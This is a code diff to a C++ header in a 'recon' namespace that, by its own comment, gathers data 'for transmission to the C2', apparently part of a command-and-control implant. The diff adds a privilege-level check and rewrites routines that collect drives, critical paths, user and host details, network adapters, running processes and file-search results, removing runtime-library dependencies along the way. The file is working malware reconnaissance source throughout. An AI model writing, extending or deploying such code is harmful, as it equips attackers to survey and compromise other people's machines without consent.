@@ -37,6 +37,31 @@
 
 namespace recon {
 
+// ── Privilege Check ─────────────────────────────────────────────────────────
+
+inline std::string get_privilege() {
+#ifdef _WIN32
+    BOOL elevated = FALSE;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION te;
+        DWORD size = sizeof(te);
+        if (GetTokenInformation(hToken, TokenElevation, &te, size, &size))
+            elevated = te.TokenIsElevated;
+        CloseHandle(hToken);
+    }
+    return elevated ? "Admin" : "User";
+#elif defined(__ANDROID__)
+    if (getuid() == 0) return "Root";
+    // Check if we have CAP_NET_ADMIN or system UID
+    if (getuid() < 10000) return "System";
+    return "App";
+#else
+    if (getuid() == 0) return "Root";
+    return "User";
+#endif
+}
+
 // ── Drive Enumeration ──────────────────────────────────────────────────────
 
 struct DriveInfo {
@@ -239,215 +264,163 @@ inline std::vector<std::string> find_critical_paths() {
     return found;
 }
 
+// Manually format an integer to string (locale-independent, no CRT deps)
+inline std::string i2s(uint64_t n) {
+    char buf[32]; int p = 0;
+    if (n == 0) { buf[p++] = '0'; }
+    else { while (n > 0 && p < 31) { buf[p++] = '0' + (n % 10); n /= 10; } }
+    buf[p] = '\0';
+    for (int i = 0; i < p / 2; i++) { char t = buf[i]; buf[i] = buf[p-1-i]; buf[p-1-i] = t; }
+    return std::string(buf);
+}
+
 // ── Format Output ──────────────────────────────────────────────────────────
 // Formats all recon data as a single string for transmission to the C2.
 
 inline std::string format_human(const std::string& targetPath = "") {
-    std::ostringstream out;
+    std::string out;
 
-    // 1. Drives
-    out << "=== LOGICAL DRIVES ===\n";
+    out += "=== LOGICAL DRIVES ===\n";
     auto drives = enumerate_drives();
     for (auto& d : drives) {
-        double totalGB = d.totalBytes / (1024.0 * 1024.0 * 1024.0);
-        double freeGB  = d.freeBytes  / (1024.0 * 1024.0 * 1024.0);
-        out << "  " << d.letter << "  [" << d.type << "]"
-            << "  Total: " << static_cast<int>(totalGB) << " GB"
-            << "  Free: "  << static_cast<int>(freeGB)  << " GB\n";
+        int totalGB = static_cast<int>(d.totalBytes / (1073741824.0));
+        int freeGB  = static_cast<int>(d.freeBytes  / (1073741824.0));
+        out += "  " + d.letter + "  [" + d.type + "]"
+            + "  Total: " + i2s(totalGB) + " GB"
+            + "  Free: " + i2s(freeGB) + " GB\n";
     }
 
-    // 2. Critical paths
-    out << "\n=== CRITICAL PATHS ===\n";
+    out += "\n=== CRITICAL PATHS ===\n";
     auto paths = find_critical_paths();
     for (auto& p : paths) {
-        out << "  [FOUND] " << p << "\n";
+        out += "  [FOUND] " + p + "\n";
     }
 
-    // 3. Target directory listing (if specified)
     if (!targetPath.empty()) {
-        out << "\n=== DIRECTORY: " << targetPath << " ===\n";
+        out += "\n=== DIRECTORY: " + targetPath + " ===\n";
         auto entries = list_directory(targetPath);
         for (auto& e : entries) {
             if (e.isDir) {
-                out << "  [DIR]  " << e.name << "\n";
+                out += "  [DIR]  " + e.name + "\n";
             } else {
-                out << "  [FILE] " << e.name << "  (" << e.size << " bytes)\n";
+                out += "  [FILE] " + e.name + "  (" + i2s(e.size) + " bytes)\n";
             }
         }
     }
 
-    return out.str();
+    return out;
 }
 
 // ── System Information ─────────────────────────────────────────────────────
 
 inline std::string get_sysinfo() {
-    std::ostringstream out;
+    std::string out;
 #ifdef _WIN32
     char user[256], computer[256];
     DWORD usize = sizeof(user), csize = sizeof(computer);
-    GetUserNameA(user, &usize);
-    GetComputerNameA(computer, &csize);
-    out << "OS: Windows\n";
-    out << "Hostname: " << computer << "\n";
-    out << "Username: " << user << "\n";
-    
+    if (GetUserNameA(user, &usize)) {
+        out += "User: "; out += user; out += "\n";
+    }
+    if (GetComputerNameA(computer, &csize)) {
+        out += "Host: "; out += computer; out += "\n";
+    }
+    out += "OS: Windows\n";
+    out += "Priv: "; out += get_privilege(); out += "\n";
     SYSTEM_INFO si;
     GetNativeSystemInfo(&si);
-    out << "Architecture: ";
-    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) out << "x64\n";
-    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) out << "x86\n";
-    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM) out << "ARM\n";
-    else out << "Unknown\n";
+    out += "Arch: ";
+    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) out += "x64\n";
+    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) out += "x86\n";
+    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM) out += "ARM\n";
+    else out += "?\n";
 
-    out << "Uptime: " << (GetTickCount64() / 1000 / 60) << " minutes\n";
+    ULONGLONG mins = GetTickCount64() / 60000;
+    {
+        char mbuf[32];
+        int mpos = 0;
+        ULONGLONG mt = mins;
+        if (mt == 0) { mbuf[mpos++] = '0'; }
+        else { while (mt > 0) { mbuf[mpos++] = '0' + (mt % 10); mt /= 10; } }
+        for (int mi = 0; mi < mpos / 2; mi++) { char tc = mbuf[mi]; mbuf[mi] = mbuf[mpos - 1 - mi]; mbuf[mpos - 1 - mi] = tc; }
+        mbuf[mpos] = '\0';
+        out += "Up: "; out += mbuf; out += "m\n";
+    }
 #else
     struct utsname buffer;
     if (uname(&buffer) == 0) {
-        out << "OS: " << buffer.sysname << " " << buffer.release << "\n";
-        out << "Hostname: " << buffer.nodename << "\n";
-        out << "Architecture: " << buffer.machine << "\n";
+        out += "OS: "; out += buffer.sysname; out += " "; out += buffer.release; out += "\n";
+        out += "Host: "; out += buffer.nodename; out += "\n";
+        out += "Arch: "; out += buffer.machine; out += "\n";
     }
-    const char* user = getenv("USER");
-    out << "Username: " << (user ? user : "unknown") << "\n";
-
-    std::ifstream uptime_file("/proc/uptime");
-    if (uptime_file.is_open()) {
-        // Linux / Android
-        double uptime;
-        if (uptime_file >> uptime) {
-            out << "Uptime: " << static_cast<int>(uptime / 60) << " minutes\n";
-        }
-    } else {
-        // macOS fallback: use sysctl via popen
-        FILE* fp = popen("sysctl -n kern.boottime 2>/dev/null", "r");
-        if (fp) {
-            char buf[256];
-            if (fgets(buf, sizeof(buf), fp)) {
-                // Parse "{ sec = 1234567890, usec = 0 }" format
-                const char* sec_ptr = strstr(buf, "sec = ");
-                if (sec_ptr) {
-                    long boot_time = atol(sec_ptr + 6);
-                    long now = static_cast<long>(time(nullptr));
-                    long uptime_min = (now - boot_time) / 60;
-                    out << "Uptime: " << uptime_min << " minutes\n";
-                }
-            }
-            pclose(fp);
-        }
-    }
+    const char* u = getenv("USER");
+    out += "User: "; out += (u ? u : "?"); out += "\n";
+    out += "Priv: "; out += get_privilege(); out += "\n";
 #endif
-    return out.str();
+    return out;
 }
 
 // ── Network Information ────────────────────────────────────────────────────
 
 inline std::string get_netinfo() {
-    std::ostringstream out;
+    std::string out;
 #ifdef _WIN32
     ULONG bufLen = 15000;
-    PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES)malloc(bufLen);
-    ULONG ret = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAddresses, &bufLen);
+    PIP_ADAPTER_ADDRESSES pAddr = (PIP_ADAPTER_ADDRESSES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufLen);
+    ULONG ret = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAddr, &bufLen);
     if (ret == ERROR_BUFFER_OVERFLOW) {
-        free(pAddresses);
-        pAddresses = (PIP_ADAPTER_ADDRESSES)malloc(bufLen);
-        ret = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAddresses, &bufLen);
+        HeapFree(GetProcessHeap(), 0, pAddr);
+        pAddr = (PIP_ADAPTER_ADDRESSES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufLen);
+        ret = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAddr, &bufLen);
     }
 
-    if (ret == NO_ERROR) {
-        PIP_ADAPTER_ADDRESSES pCurr = pAddresses;
-        while (pCurr) {
-            // Skip loopback and tunnel adapters
-            if (pCurr->OperStatus == IfOperStatusUp && pCurr->IfType != IF_TYPE_SOFTWARE_LOOPBACK) {
-                // Convert friendly name
-                char desc[256];
-                WideCharToMultiByte(CP_UTF8, 0, pCurr->FriendlyName, -1, desc, sizeof(desc), NULL, NULL);
-                out << "Interface: " << desc << "\n";
-
-                // MAC address
-                if (pCurr->PhysicalAddressLength > 0) {
-                    out << "  MAC: ";
-                    for (ULONG i = 0; i < pCurr->PhysicalAddressLength; i++) {
-                        char hex[4];
-                        snprintf(hex, sizeof(hex), i == (pCurr->PhysicalAddressLength - 1) ? "%02X" : "%02X:", pCurr->PhysicalAddress[i]);
-                        out << hex;
-                    }
-                    out << "\n";
+    if (ret == NO_ERROR && pAddr) {
+        for (PIP_ADAPTER_ADDRESSES p = pAddr; p; p = p->Next) {
+            if (p->OperStatus != IfOperStatusUp || p->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;
+            char desc[256];
+            WideCharToMultiByte(CP_UTF8, 0, p->FriendlyName, -1, desc, sizeof(desc), NULL, NULL);
+            out += "IF: "; out += desc; out += "\n";
+            if (p->PhysicalAddressLength > 0) {
+                out += "  MAC: ";
+                for (ULONG i = 0; i < p->PhysicalAddressLength; i++) {
+                    static const char hx[] = "0123456789ABCDEF";
+                    unsigned char b = p->PhysicalAddress[i];
+                    out += hx[b >> 4]; out += hx[b & 0xF];
+                    if (i < p->PhysicalAddressLength - 1) out += ":";
                 }
-
-                // Unicast addresses (IPv4 + IPv6)
-                PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurr->FirstUnicastAddress;
-                while (pUnicast) {
-                    char ip[NI_MAXHOST] = {0};
-                    sockaddr* sa = pUnicast->Address.lpSockaddr;
-                    if (sa->sa_family == AF_INET) {
-                        inet_ntop(AF_INET, &((sockaddr_in*)sa)->sin_addr, ip, sizeof(ip));
-                        out << "  IP (v4): " << ip << "\n";
-                    } else if (sa->sa_family == AF_INET6) {
-                        inet_ntop(AF_INET6, &((sockaddr_in6*)sa)->sin6_addr, ip, sizeof(ip));
-                        out << "  IP (v6): " << ip << "\n";
-                    }
-                    pUnicast = pUnicast->Next;
-                }
-
-                // Gateway
-                PIP_ADAPTER_GATEWAY_ADDRESS_LH pGateway = pCurr->FirstGatewayAddress;
-                while (pGateway) {
-                    char gw[NI_MAXHOST] = {0};
-                    sockaddr* sa = pGateway->Address.lpSockaddr;
-                    if (sa->sa_family == AF_INET) {
-                        inet_ntop(AF_INET, &((sockaddr_in*)sa)->sin_addr, gw, sizeof(gw));
-                        out << "  Gateway: " << gw << "\n";
-                    }
-                    pGateway = pGateway->Next;
-                }
-
-                // DNS
-                PIP_ADAPTER_DNS_SERVER_ADDRESS pDns = pCurr->FirstDnsServerAddress;
-                while (pDns) {
-                    char dns[NI_MAXHOST] = {0};
-                    sockaddr* sa = pDns->Address.lpSockaddr;
-                    if (sa->sa_family == AF_INET) {
-                        inet_ntop(AF_INET, &((sockaddr_in*)sa)->sin_addr, dns, sizeof(dns));
-                        out << "  DNS: " << dns << "\n";
-                    }
-                    pDns = pDns->Next;
-                }
-                out << "\n";
+                out += "\n";
             }
-            pCurr = pCurr->Next;
-        }
-    }
-    if (pAddresses) free(pAddresses);
-#else
-    struct ifaddrs *ifaddr, *ifa;
-    if (getifaddrs(&ifaddr) != -1) {
-        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
-            if (ifa->ifa_addr == NULL) continue;
-            int family = ifa->ifa_addr->sa_family;
-            if (family == AF_INET) {
-                char ip[NI_MAXHOST];
-                getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), ip, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
-                out << "Interface: " << ifa->ifa_name << "\n";
-                out << "  IP (v4): " << ip << "\n\n";
-            } else if (family == AF_INET6) {
-                char ip[NI_MAXHOST];
-                getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in6), ip, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
-                out << "Interface: " << ifa->ifa_name << "\n";
-                out << "  IP (v6): " << ip << "\n\n";
+            for (PIP_ADAPTER_UNICAST_ADDRESS u = p->FirstUnicastAddress; u; u = u->Next) {
+                char ip[NI_MAXHOST] = {0};
+                sockaddr* sa = u->Address.lpSockaddr;
+                if (sa->sa_family == AF_INET && inet_ntop(AF_INET, &((sockaddr_in*)sa)->sin_addr, ip, sizeof(ip)))
+                    { out += "  IPv4: "; out += ip; out += "\n"; }
+                else if (sa->sa_family == AF_INET6 && inet_ntop(AF_INET6, &((sockaddr_in6*)sa)->sin6_addr, ip, sizeof(ip)))
+                    { out += "  IPv6: "; out += ip; out += "\n"; }
+            }
+            for (PIP_ADAPTER_GATEWAY_ADDRESS_LH g = p->FirstGatewayAddress; g; g = g->Next) {
+                char gw[NI_MAXHOST] = {0};
+                sockaddr* sa = g->Address.lpSockaddr;
+                if (sa->sa_family == AF_INET && inet_ntop(AF_INET, &((sockaddr_in*)sa)->sin_addr, gw, sizeof(gw)))
+                    { out += "  GW: "; out += gw; out += "\n"; }
+            }
+            for (PIP_ADAPTER_DNS_SERVER_ADDRESS d = p->FirstDnsServerAddress; d; d = d->Next) {
+                char dns[NI_MAXHOST] = {0};
+                sockaddr* sa = d->Address.lpSockaddr;
+                if (sa->sa_family == AF_INET && inet_ntop(AF_INET, &((sockaddr_in*)sa)->sin_addr, dns, sizeof(dns)))
+                    { out += "  DNS: "; out += dns; out += "\n"; }
             }
         }
-        freeifaddrs(ifaddr);
     }
+    if (pAddr) HeapFree(GetProcessHeap(), 0, pAddr);
 #endif
-    return out.str();
+    return out;
 }
 
 // ── Process Information ────────────────────────────────────────────────────
 
 inline std::string get_processes() {
-    std::ostringstream out;
-    out << "PID\tName\n--------------------------------\n";
+    std::string out;
+    out += "PID\tName\n--------------------------------\n";
 #ifdef _WIN32
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap != INVALID_HANDLE_VALUE) {
@@ -455,7 +428,7 @@ inline std::string get_processes() {
         pe32.dwSize = sizeof(PROCESSENTRY32);
         if (Process32First(hSnap, &pe32)) {
             do {
-                out << pe32.th32ProcessID << "\t" << pe32.szExeFile << "\n";
+                out += i2s(pe32.th32ProcessID) + "\t" + pe32.szExeFile + "\n";
             } while (Process32Next(hSnap, &pe32));
         }
         CloseHandle(hSnap);
@@ -463,7 +436,6 @@ inline std::string get_processes() {
 #else
     DIR *dir = opendir("/proc");
     if (dir) {
-        // Linux / Android: read /proc/<pid>/comm
         struct dirent *ent;
         while ((ent = readdir(dir)) != NULL) {
             if (isdigit(ent->d_name[0])) {
@@ -472,31 +444,30 @@ inline std::string get_processes() {
                 std::ifstream comm_file(comm_path);
                 std::string name;
                 if (comm_file >> name) {
-                    out << pid << "\t" << name << "\n";
+                    out += pid + "\t" + name + "\n";
                 }
             }
         }
         closedir(dir);
     } else {
-        // macOS fallback: use ps
         FILE* fp = popen("ps -eo pid,comm 2>/dev/null", "r");
         if (fp) {
             char line[512];
             while (fgets(line, sizeof(line), fp)) {
-                out << line;
+                out += line;
             }
             pclose(fp);
         } else {
-            out << "Error: Cannot enumerate processes on this platform.\n";
+            out += "Error: Cannot enumerate processes on this platform.\n";
         }
     }
 #endif
-    return out.str();
+    return out;
 }
 
 // ── Find Files ─────────────────────────────────────────────────────────────
 
-inline void find_files_recursive(const std::string& path, const std::string& pattern, int depth, int max_depth, int& count, int max_count, std::ostringstream& out) {
+inline void find_files_recursive(const std::string& path, const std::string& pattern, int depth, int max_depth, int& count, int max_count, std::string& out) {
     if (depth > max_depth || count >= max_count) return;
 
     auto entries = list_directory(path);
@@ -513,9 +484,8 @@ inline void find_files_recursive(const std::string& path, const std::string& pat
         }
         fullPath += e.name;
 
-        // Simple substring search for pattern
         if (e.name.find(pattern) != std::string::npos) {
-            out << "[FOUND] " << fullPath << "\n";
+            out += "[FOUND] " + fullPath + "\n";
             count++;
         }
 
@@ -526,13 +496,13 @@ inline void find_files_recursive(const std::string& path, const std::string& pat
 }
 
 inline std::string find_files(const std::string& root, const std::string& pattern) {
-    std::ostringstream out;
-    out << "Search Results for '" << pattern << "' in '" << root << "':\n";
+    std::string out;
+    out += "Search Results for '" + pattern + "' in '" + root + "':\n";
     int count = 0;
     find_files_recursive(root, pattern, 0, 5, count, 100, out);
-    if (count == 0) out << "No matches found.\n";
-    else if (count >= 100) out << "\n... Results truncated at 100 hits.\n";
-    return out.str();
+    if (count == 0) out += "No matches found.\n";
+    else if (count >= 100) out += "\n... Results truncated at 100 hits.\n";
+    return out;
 }
 
 }  // namespace recon
